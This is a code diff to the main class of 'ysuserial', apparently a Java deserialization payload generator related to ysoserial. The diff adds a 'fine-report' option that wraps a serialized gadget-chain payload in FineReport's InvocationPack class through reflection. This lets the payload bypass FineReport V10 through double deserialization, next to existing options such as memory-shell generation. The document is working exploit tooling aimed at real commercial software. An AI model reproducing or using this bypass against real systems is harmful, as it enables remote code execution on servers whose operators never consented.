@@ -1,7 +1,6 @@
 package org.su18.ysuserial;
 
-import java.io.FileOutputStream;
-import java.io.OutputStream;
+import java.io.*;
 import java.util.*;
 
 import org.apache.commons.cli.*;
@@ -10,6 +9,7 @@ import org.su18.ysuserial.payloads.ObjectPayload.Utils;
 
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
+import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
@@ -46,6 +46,7 @@ public class GeneratePayload {
 		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
 		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
 		options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
+		options.addOption("fr", "fine-report", false, "FineReport V10 Double-Deserialization Bypass");
 
 		CommandLineParser parser = new DefaultParser();
 
@@ -111,6 +112,10 @@ public class GeneratePayload {
 			USING_MOZILLA_DEFININGCLASSLOADER = true;
 		}
 
+		if (cmdLine.hasOption("fine-report")) {
+			FINE_REPORT_BYPASS = true;
+		}
+
 		if (cmdLine.hasOption("gen-mem-shell")) {
 			GEN_MEM_SHELL = true;
 
@@ -157,6 +162,19 @@ public class GeneratePayload {
 			} else {
 				out = System.out;
 			}
+
+			// FineReport InvocationPack 二次反序列化 Bypass
+			if (FINE_REPORT_BYPASS) {
+				ByteArrayOutputStream baos = new ByteArrayOutputStream();
+				Serializer.serialize(object, baos);
+				byte[]   array  = baos.toByteArray();
+				Class    c      = Class.forName("com.fr.rpc.serialization.InvocationSerializer$InvocationPack");
+				byte[][] params = new byte[][]{array};
+				Object   o      = Reflections.createInstanceUnsafely(c);
+				Reflections.setFieldValue(o, "params", params);
+				object = o;
+			}
+
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
 
